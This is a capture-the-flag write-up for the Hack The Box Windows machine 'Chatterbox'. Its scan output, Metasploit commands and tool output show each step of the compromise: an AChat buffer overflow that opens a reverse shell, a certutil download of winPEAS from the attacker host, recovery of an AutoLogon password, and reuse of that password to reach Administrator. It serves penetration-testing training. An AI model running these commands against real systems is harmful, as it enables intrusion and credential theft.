# Target
| Category          | Details                                                      |
|-------------------|--------------------------------------------------------------|
| 📝 **Name**       | [Chatterbox](https://app.hackthebox.com/machines/Chatterbox) |  
| 🏷 **Type**       | HTB Machine                                                  |
| 🖥 **OS**         | Windows                                                      |
| 🎯 **Difficulty** | Medium                                                       |
| 📁 **Tags**       | AChat, CVE-2025-34127, Password reuse                        |

# Scan
```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-11-20T07:20:46-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6h40m01s, deviation: 2h53m14s, median: 5h00m00s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-20T12:20:48
|_  start_date: 2025-11-20T12:15:38
```

# Attack path
1. [Gain initial foothold by exploiting CVE-2025-34127](#gain-initial-foothold-by-exploiting-cve-2025-34127)
2. [Escalate to `Administrator` user by reusing password discovered for `Alfred` user](#escalate-to-administrator-user-by-reusing-password-discovered-for-alfred-user)

### Gain initial foothold by exploiting [CVE-2025-34127](https://nvd.nist.gov/vuln/detail/CVE-2025-34127)

#### Exploit [CVE-2025-34127](https://nvd.nist.gov/vuln/detail/CVE-2025-34127) with `windows/misc/achat_bof`
Using `windows/shell/reverse_tcp` payload as `windows/meterpreter/reverse_tcp` session is killed, probably by AV. 
```
msf > search achat

Matching Modules
================

   #  Name                            Disclosure Date  Rank    Check  Description
   -  ----                            ---------------  ----    -----  -----------
   0  exploit/windows/misc/achat_bof  2014-12-18       normal  No     Achat Unicode SEH Buffer Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/misc/achat_bof

msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/misc/achat_bof) > set RHOST 10.129.52.99
RHOST => 10.129.52.99
msf exploit(windows/misc/achat_bof) > set LHOST tun0
LHOST => 10.10.16.54
msf exploit(windows/misc/achat_bof) > set PAYLOAD payload/windows/shell/reverse_tcp
PAYLOAD => windows/shell/reverse_tcp
msf exploit(windows/misc/achat_bof) > run
[*] Started reverse TCP handler on 10.10.16.54:4444 
[*] Sending stage (240 bytes) to 10.129.52.99
[*] Command shell session 1 opened (10.10.16.54:4444 -> 10.129.52.99:49159) at 2025-11-20 17:35:45 +0100


Shell Banner:
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
-----
          

C:\Windows\system32>whoami
whoami
chatterbox\alfred
```

### Escalate to `Administrator` user by reusing password discovered for `Alfred` user

#### Download `winPEASx86.exe` using `certutil`
`winPEASx86.exe` hosted from attacker over HTTP
```
C:\Windows\system32>certutil -urlcache -split -f http://10.10.16.54/PEAS/winPEASx86.exe C:\Users\Alfred\Downloads\winPEASx86.exe
certutil -urlcache -split -f http://10.10.16.54/PEAS/winPEASx86.exe C:\Users\Alfred\Downloads\winPEASx86.exe
****  Online  ****
  000000  ...
  9b3600
CertUtil: -URLCache command completed successfully.
```

#### Discover AutoLogon credentials for `Alfred` user with `winPEASx86.exe`
```
C:\Windows\system32>C:\Users\Alfred\Downloads\winPEASx86.exe
<SNIP>
����������͹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  Alfred
    DefaultPassword               :  Welcome1!
<SNIP>
```

#### Confirm credentials are valid
```
┌──(magicrc㉿perun)-[~/attack/HTB Chatterbox]
└─$ netexec smb $TARGET -u Alfred -p 'Welcome1!' 
SMB         10.129.52.99    445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 x32 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         10.129.52.99    445    CHATTERBOX       [+] Chatterbox\Alfred:Welcome1! 
```

#### Reuse credentials for `Administrator` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Chatterbox]
└─$ netexec smb $TARGET -u Administrator -p 'Welcome1!'
SMB         10.129.52.99    445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 x32 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         10.129.52.99    445    CHATTERBOX       [+] Chatterbox\Administrator:Welcome1! (Pwn3d!)
```

#### Confirm escalation
```
┌──(magicrc㉿perun)-[~/attack/HTB Chatterbox]
└─$ netexec smb $TARGET -u Administrator -p 'Welcome1!' -x 'whoami'     
SMB         10.129.52.99    445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 x32 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True)
SMB         10.129.52.99    445    CHATTERBOX       [+] Chatterbox\Administrator:Welcome1! (Pwn3d!)
SMB         10.129.52.99    445    CHATTERBOX       [+] Executed command via wmiexec
SMB         10.129.52.99    445    CHATTERBOX       chatterbox\administrator
```
